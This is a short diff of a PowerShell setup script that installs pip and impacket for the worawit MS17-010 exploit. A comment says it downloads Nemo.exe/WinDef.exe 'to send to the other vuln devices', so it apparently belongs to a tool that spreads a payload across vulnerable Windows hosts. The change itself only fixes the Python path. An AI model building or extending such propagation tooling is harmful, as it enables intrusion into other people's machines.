@@ -50,8 +50,8 @@ $Location = '' + $save_dir + '\' + 'get-pip.py';
 Start-Process -FilePath $wgetBinLocation -Args " https://bootstrap.pypa.io/get-pip.py -O $Location" -passthru -NoNewWindow -Wait
 
 # Install impacket - Why? Becasue worawit/MS17-010 uses it
-python $Location
-python -m pip  install impacket
+c:\python27\python $Location
+c:\python27\python -m pip  install impacket
 
 
 # Download Nemo.exe/WinDef.exe to send to the other vuln devices.
